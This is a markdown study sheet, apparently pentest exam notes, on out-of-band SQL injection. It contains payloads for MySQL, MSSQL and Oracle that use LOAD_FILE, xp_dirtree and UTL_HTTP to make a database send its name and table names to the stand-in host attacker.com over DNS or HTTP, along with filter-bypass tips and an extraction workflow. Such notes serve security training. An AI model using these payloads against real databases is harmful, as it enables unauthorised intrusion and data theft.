## Advanced Injection Attacks — Out-of-Band (OOB) SQL Injection

## Objective
Exfiltrate data when no direct response is available by:
- Forcing the database to make external requests
- Capturing data on attacker-controlled server

Think: *“If I can’t see the response, can I make the DB send it to me?”*

---

## 1. When to Use OOB

- No visible output (blind)
- No time-based feedback
- Limited response control
- WAF blocking normal techniques

---

## 2. Core Idea

```
App → DB executes query → DB makes request → Attacker server receives data
```

---

## 3. Requirements

- Database supports outbound requests
- Target can reach attacker server (DNS/HTTP)
- You control external listener

---

## 4. Common Techniques

### A. DNS Exfiltration (Most Reliable)

#### Example (generic)

```sql
' UNION SELECT load_file(CONCAT('\\\\',database(),'.attacker.com\\a'))--
```

→ DB triggers DNS request:

```
<database>.attacker.com
```

---

### B. HTTP Requests

#### Example

```sql
' UNION SELECT load_file('http://attacker.com')--
```

---

### C. DB-Specific Payloads

#### MySQL

```sql
SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))
```

---

#### MSSQL

```sql
exec master..xp_dirtree '\\attacker.com\share'
```

---

#### Oracle

```sql
UTL_HTTP.request('http://attacker.com')
```

---

## 5. Data Exfiltration

### Extract database name

```sql
' UNION SELECT load_file(CONCAT('\\\\',database(),'.attacker.com\\a'))--
```

---

### Extract table name

```sql
' UNION SELECT load_file(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables LIMIT 1),'.attacker.com\\a'))--
```

---

## 6. Detection

### Step 1: Send payload

```sql
' OR load_file('\\\\attacker.com\\a')--
```

---

### Step 2: Monitor

- DNS logs
- HTTP requests
- Burp Collaborator

---

### Indicators

- Incoming DNS request
- External callback triggered

---

## 7. Tools

- Burp Collaborator
- Interactsh
- Custom DNS server

---

## 8. Bypass Techniques

- Encode payload
- Split payload
- Use DNS instead of HTTP (less filtered)

---

## 9. Indicators of Vulnerability

- External DNS/HTTP request received
- Data embedded in subdomain
- Consistent callbacks per request

---

## 10. Fast Workflow (Exam Mode)

1. Suspect blind SQLi
2. Setup listener (Burp Collaborator)
3. Send OOB payload
4. Check for callback
5. If confirmed:
   - extract DB name
   - extract tables
6. Iterate data extraction

---

## 11. Mental Model

No output doesn’t mean no vulnerability.

You create a new output channel:

→ Database → External server  

You don’t read the response  
→ You receive it